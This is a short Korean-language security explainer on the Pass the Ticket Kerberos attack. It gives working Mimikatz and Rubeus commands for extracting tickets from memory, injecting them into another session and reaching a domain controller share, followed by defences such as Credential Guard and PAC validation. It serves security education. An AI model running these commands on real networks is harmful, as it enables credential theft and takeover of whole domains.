Pass the Ticket

Kerberos 티켓을 탈취하여 인증 없이 서비스 접근

#1. Pass the Ticket이란?

🎫 ➜ 💉 ➜ 🔓 ➜ 💥

"Kerberos 티켓을 탈취하여 재사용"

Pass the Ticket (PtT)은 메모리에서 Kerberos TGT나 서비스 티켓을 추출하여 다른 세션에 주입하는 공격입니다. 비밀번호나 해시 없이 다른 사용자로 인증할 수 있습니다.

주요 공격 도구

# Mimikatz로 티켓 추출
mimikatz# sekurlsa::tickets /export

# 티켓 주입
mimikatz# kerberos::ptt ticket.kirbi

# Rubeus
Rubeus.exe dump /service:krbtgt

왜 위험한가?

비밀번호 불필요

Kerberos 티켓만으로 인증이 가능하여 비밀번호나 해시를 모르고도 서비스에 접근합니다.

높은 권한 탈취

도메인 관리자의 TGT를 탈취하면 도메인 전체에 대한 완전한 접근 권한을 획득합니다.

#2. 공격 기법 분석

Kerberos 티켓 탈취 및 주입

# TGT 추출 (Golden Ticket 전 단계)
mimikatz# sekurlsa::tickets /export

# 다른 세션에 티켓 주입
mimikatz# kerberos::ptt admin_ticket.kirbi

# 접근 확인
dir \\\\DC01\\C$

Rubeus를 이용한 티켓 조작

# 현재 세션의 모든 티켓 덤프
Rubeus.exe triage
Rubeus.exe dump /nowrap

# 특정 서비스 티켓 요청 및 사용
Rubeus.exe asktgs /ticket:base64_tgt /service:cifs/DC01.corp.local

탐지 및 방어 전략

🛡️

Credential Guard: Windows Credential Guard로 메모리에서 티켓 추출 방지

🛡️

Kerberos 이상 탐지: 비정상적인 TGT 사용 패턴(다른 IP에서 같은 TGT 사용) 모니터링

🛡️

PAC 검증: Privilege Attribute Certificate 검증을 통한 위조 티켓 탐지
